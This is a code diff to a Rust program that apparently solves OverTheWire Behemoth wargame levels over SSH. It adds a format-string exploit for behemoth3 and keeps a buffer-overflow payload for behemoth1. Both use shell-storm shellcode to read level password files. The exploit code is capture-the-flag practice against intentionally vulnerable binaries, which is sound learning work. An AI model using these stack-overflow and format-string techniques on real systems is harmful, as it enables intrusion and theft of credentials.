@@ -64,6 +64,14 @@ fn write_line(channel: &mut Channel, line: &str) -> Result<()> {
     Ok(())
 }
 
+fn hex_literal(bytes: &[u8]) -> String {
+    let mut encoded = String::new();
+    for b in bytes {
+        encoded += &format!("\\x{:02x?}", b);
+    }
+    encoded
+}
+
 fn behemoth0(password: &str) -> Result<String> {
     // for behemoth 0, the password to the binary can be found by looking for strcmp in an ltrace
     // upon submitting the real password, it will open a shell
@@ -120,8 +128,8 @@ fn behemoth1(password: &str) -> Result<String> {
     read_until(&mut channel, "behemoth1@gibson:~$ ")?;
 
     let nop_sled: Vec<u8> = vec![0x90; 69]; // the offset is 71 to the ret address. 71 - length of jmp is 69 (nice)
-    let jmp_esp = hex::decode("eb04").unwrap(); // jmp 6 (4 + length of instruction, eb 04), used to jump over the next four bytes below
-    let var_adr = hex::decode("01d5ffff").unwrap(); // 0xffffd501, approximate location in nop sled
+    let jmp_esp = hex::decode("eb04")?; // jmp 6 (4 + length of instruction, eb 04), used to jump over the next four bytes below
+    let var_adr = hex::decode("01d5ffff")?; // 0xffffd501, approximate location in nop sled
     let file_read_shellcode = hex::decode("31C031DB31C931D2EB325BB00531C9CD8089C6EB06B00131DBCD8089F3B00383EC018D0C24B201CD8031DB39C374E6B004B301B201CD8083C401EBDFE8C9FFFFFF").unwrap(); // https://shell-storm.org/shellcode/files/shellcode-73.html
     let file_to_read = "/etc/behemoth_pass/behemoth2".as_bytes(); // shell code above uses sys_open/sys_read/sys_write to print the contents of the filepath following it, specified here
 
@@ -132,10 +140,7 @@ fn behemoth1(password: &str) -> Result<String> {
     full_payload.extend(file_read_shellcode);
     full_payload.extend(file_to_read);
 
-    let mut encoded = String::new();
-    for b in full_payload {
-        encoded += &format!("\\x{:02x?}", b);
-    }
+    let encoded = hex_literal(&full_payload);
 
     let target = "/behemoth/behemoth1";
     println!("running 'echo -e [payload] | {target}'");
@@ -195,11 +200,44 @@ fn behemoth3(password: &str) -> Result<String> {
     //     puts("\naaaand goodbye again.");
     //     return 0;
     // }
-    // stack isn't executable. best approach is to use the format string bug to overwrite an address in the GLT or the return address
-    // to point at shellcode in a env var or similar.
+    // [*] '/behemoth/behemoth3'
+    // Arch:     i386-32-little
+    // RELRO:    No RELRO
+    // Stack:    No canary found
+    // NX:       NX unknown - GNU_STACK missing
+    // PIE:      No PIE (0x8048000)
+    // Stack:    Executable
+    // RWX:      Has RWX segments
+    //
+    // just need to overwrite the ret address (or somewhere in the got) with the stack address to run shellcode
+    // idea will be nops + shellcode + padded value + target for lower bytes, padded value + target for higher bytes
+
+    let ret_addr1 = hex::decode("2cd5ffff")?; // 0xffffd52c, found by breaking at ret from main and then p $sp
+    let ret_addr2 = hex::decode("2ed5ffff")?; // two bytes up to write the higher bytes of the address
+
+    let nop_sled: Vec<u8> = vec![0x90; 40]; 
+    let file_read_shellcode = hex::decode("31C031DB31C931D2EB325BB00531C9CD8089C6EB06B00131DBCD8089F3B00383EC018D0C24B201CD8031DB39C374E6B004B301B201CD8083C401EBDFE8C9FFFFFF").unwrap(); // https://shell-storm.org/shellcode/files/shellcode-73.html
+    let file_to_read = "/etc/behemoth_pass/behemoth4".as_bytes(); // shell code above uses sys_open/sys_read/sys_write to print the contents of the filepath following it, specified here
+
+    // 0xffffd501, approximate location in nop sled. want to set ret to this
+    let lower_two = "%1$54235x %1$n".as_bytes(); // print some ridiculous number of spaces, followed by an 'n'. this will write the total amount so far to the address at n's position, beginning of stack
+    let upper_two = "%1$76693x %2$n".as_bytes();
+    
+    let mut full_payload: Vec<u8> = Vec::new();
+    full_payload.extend(ret_addr1);
+    full_payload.extend(ret_addr2);
+    full_payload.extend(nop_sled);
+    full_payload.extend(file_read_shellcode);
+    full_payload.extend(file_to_read);
+    full_payload.extend(lower_two);
+    full_payload.extend(upper_two);
+
+    let encoded = hex_literal(&full_payload);
+    println!("{encoded}");
+
+    panic!("early exit");
 
     let session = ssh_session("behemoth3", password)?;
-
     let mut channel = session.channel_session()?;
     create_shell(&mut channel)?;
 
